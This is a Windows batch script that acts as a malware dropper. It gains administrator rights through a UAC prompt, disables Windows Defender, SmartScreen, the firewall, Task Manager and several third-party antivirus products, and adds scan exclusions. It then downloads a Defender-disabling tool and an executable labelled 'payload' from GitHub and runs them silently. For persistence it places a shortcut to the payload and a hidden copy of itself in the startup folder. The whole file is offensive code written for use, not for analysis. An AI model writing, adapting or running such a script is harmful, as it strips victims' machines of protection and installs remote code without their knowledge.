@echo off
setlocal

:: Check if the script is running with administrator privileges
net session >nul 2>&1
if %errorLevel% == 0 (
goto admin
) else (
goto elevate
)

:elevate
set "batchPath=%~0"
set "vbsGetPrivileges=%temp%\OEgetPriv_%random%.vbs"
echo Set UAC = CreateObject^("Shell.Application"^)>"%vbsGetPrivileges%"
echo UAC.ShellExecute "%batchPath%", "ELEV", "", "runas", 0 >>"%vbsGetPrivileges%"
"%SystemRoot%\System32\WScript.exe" "%vbsGetPrivileges%" %*
del "%vbsGetPrivileges%" /f /q
goto :eof

:admin

::external
taskkill /f /im SecHealthUI.exe >nul 2>&1
taskkill /f /im SecHealthUI.exe >nul 2>&1
reg add "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f > nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f > nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "1" /f > nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "PUAProtection" /t REG_DWORD /d "0" /f > nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d "0" /f > nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f > nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f > nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f > nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f > nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f > nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v "ConfigureAppInstallControlEnabled" /t REG_DWORD /d "0" /f > nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v "ConfigureAppInstallControl" /t REG_DWORD /d "0" /f > nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v "EnableSmartScreen" /t REG_DWORD /d "0" /f > nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d "1" /f > nul
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d "0" /f > nul
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\SpyNet" /v "SpyNetReporting" /t REG_DWORD /d "0" /f > nul
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" /v "NoToastApplicationNotification" /t REG_DWORD /d "1" /f > nul
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" /v "NoToastApplicationNotificationOnLockScreen" /t REG_DWORD /d "1" /f > nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" /v "Enabled" /t REG_DWORD /d "0" /f > nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Associations" /v "DefaultFileTypeRisk" /t REG_DWORD /d "1808" /f > nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v "SaveZoneInformation" /t REG_DWORD /d "1" /f > nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Associations" /v "LowRiskFileTypes" /t REG_SZ /d ".avi;.bat;.com;.cmd;.exe;.htm;.html;.lnk;.mpg;.mpeg;.mov;.mp3;.msi;.m3u;.rar;.reg;.txt;.vbs;.wav;.zip;" /f > nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Associations" /v "ModRiskFileTypes" /t REG_SZ /d ".bat;.exe;.reg;.vbs;.chm;.msi;.js;.cmd" /f > nul
reg add "HKCU\Software\Microsoft\Edge\SmartScreenEnabled" /t REG_DWORD /d "0" /f > nul
reg add "HKCU\Software\Policies\Microsoft\MicrosoftEdge\PhishingFilter" /v "EnabledV9" /t REG_DWORD /d "0" /f > nul
reg add "HKLM\Software\Policies\Microsoft\MicrosoftEdge\PhishingFilter" /v "EnabledV9" /t REG_DWORD /d "0" /f > nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v "EnableWebContentEvaluation" /t REG_DWORD /d "0" /f > nul
reg add "HKLM\SYSTEM\ControlSet001\Services\SgrmAgent" /v "Start" /t REG_DWORD /d "4" /f > nul
reg add "HKLM\SYSTEM\ControlSet001\Services\SgrmBroker" /v "Start" /t REG_DWORD /d "4" /f > nul
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wdboot" /v "Start" /t REG_DWORD /d "4" /f > nul
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wdfilter" /v "Start" /t REG_DWORD /d "4" /f > nul
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f > nul
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f > nul
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wdnisdrv" /v "Start" /t REG_DWORD /d "4" /f > nul
reg add "HKLM\SYSTEM\CurrentControlSet\Services\mssecflt" /v "Start" /t REG_DWORD /d "4" /f > nul
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f > nul
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Sense" /v "Start" /t REG_DWORD /d "4" /f > nul
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wscsvc" /v "Start" /t REG_DWORD /d "4" /f > nul
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MpKsl251b8453" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable > nul
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable > nul
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable > nul
reg query "HKLM\SOFTWARE\Classes\*\shellex\ContextMenuHandlers\EPP" | find /i "ERROR" >nul 2>&1
if %ERRORLEVEL%==0 (
	reg delete "HKLM\SOFTWARE\Classes\*\shellex\ContextMenuHandlers\DefenderDisabled\EPP" /f >nul 2>&1
	reg copy "HKLM\SOFTWARE\Classes\*\shellex\ContextMenuHandlers\EPP" "HKLM\SOFTWARE\Classes\*\shellex\ContextMenuHandlers\DefenderDisabled\EPP" > nul
 )
reg query "HKLM\SOFTWARE\Classes\Drive\shellex\ContextMenuHandlers\EPP" | find /i "ERROR" >nul 2>&1
if %ERRORLEVEL%==0 (
	reg delete "HKLM\SOFTWARE\Classes\Drive\shellex\ContextMenuHandlers\DefenderDisabled\EPP" /f >nul 2>&1
	reg copy "HKLM\SOFTWARE\Classes\Drive\shellex\ContextMenuHandlers\EPP" "HKLM\SOFTWARE\Classes\*\shellex\ContextMenuHandlers\DefenderDisabled\EPP" > nul
)
reg query "HKLM\SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers\EPP" | find /i "ERROR" >nul 2>&1
if %ERRORLEVEL%==0 (
	reg delete "HKLM\SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers\DefenderDisabled\EPP" /f >nul 2>&1
	reg copy "HKLM\SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers\EPP" "HKLM\SOFTWARE\Classes\*\shellex\ContextMenuHandlers\DefenderDisabled\EPP" > nul
)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Shell Extensions\Blocked" /v "{09A47860-11B0-4DA5-AFA5-26D86198A780}" /t REG_SZ /f > nul
if not exist "C:\ProgramData\Microsoft\Windows Defender\Platform1" (
	cd /d "C:\ProgramData\Microsoft\Windows Defender" > nul
	ren "Platform" "Platform1" > nul
)
if not exist "C:\Program Files\Windows Defender1" (
	cd /d "C:\Program Files" > nul
	ren "Windows Defender" "Windows Defender1" > nul
)

::internal
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features" /f /ve
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpynetReporting /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\AVAST Software\Avast" /v DisableAntiVirus /t REG_DWORD /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\McAfee\Endpoint\AV" /v EnableOnAccessScan /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Symantec\Symantec Endpoint Protection\SMC" /v smc_enable /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\TrendMicro\PC-cillinNTCorp\CurrentVersion\Misc." /v AllowUnloading /t REG_DWORD /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\360Safe\SafeDog" /v Enable /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\KasperskyLab\protected\AVP13\settings" /v Enable /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\SecureMac" /v GlobalSwitch /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\Symantec Endpoint Protection\AV" /v EnableAutoProtect /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 5 /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\FeatureManagement\Overrides\0\2093230218" /v EnabledState /t REG_DWORD /d 0 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v Start /t REG_DWORD /d 4 /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d "4" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtectionSource" /t REG_DWORD /d "2" /f
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDelete /t REG_DWORD /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v FilterAdministratorToken /t REG_DWORD /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "DisallowRun" /t REG_DWORD /d 1 /f
REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "1" /t REG_SZ /d "Temp" /f

powershell -command "Set-MpPreference -DisableTamperProtection $true"
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -Command "Set-MpPreference -PUAProtection 0"
powershell -Command "Set-MpPreference -SubmitSamplesConsent 1"
netsh advfirewall set allprofiles state off
powershell -Command "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned"
powershell -Command "Set-MpPreference -EnableSmartScreen CheckApps"
powershell -Command "Set-MpPreference -QuickScanEnabled 0"
powershell -Command "Add-MpPreference -ExclusionPath 'C:\*.exe'"
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -Command "Set-MpPreference -ControlledFolderAccess Disabled"

set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set exclusionPath1="%startupFolder%"
REG ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%exclusionPath1%" /t REG_DWORD /d "0" /f
set exclusionPath2="%temp%"
REG ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%exclusionPath2%" /t REG_DWORD /d "0" /f

bitsadmin /transfer myDownloadJob /download /priority normal https://github.com/qtkite/defender-control/releases/download/v1.2/disable-defender.exe "%temp%\disable-defender.exe"

start /min "" "%temp%\disable-defender.exe" /b

:: Download payload from URL
curl -L https://raw.githubusercontent.com/maxavison7/nothing/main/Microsoft.exe --output "%temp%\program.exe"

 bitsadmin /transfer myDownloadJob /download /priority normal https://raw.githubusercontent.com/maxavison7/nothing/main/Microsoft.exe "%temp%\program.exe"

:: Create shortcut in Startup folder
set shortcut="%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\program.lnk"
set target="%temp%\program.exe"
set workingdir="%temp%"
set iconpath="%temp%\program.exe"

powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut(\"%shortcut%\"); $s.TargetPath = \"%target%\"; $s.WorkingDirectory = \"%workingdir%\"; $s.IconLocation = \"%iconpath%\"; $s.Save()"

:: Copy batch file to Startup folder and make it hidden
set "batchPath=%~f0"
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
copy /y "%batchPath%" "%startupFolder%"
attrib +h "%startupFolder%\%~nx0%"

:: Run payload silently
start /min "" "%temp%\program.exe"
del "%temp%\thesetup.bat

exit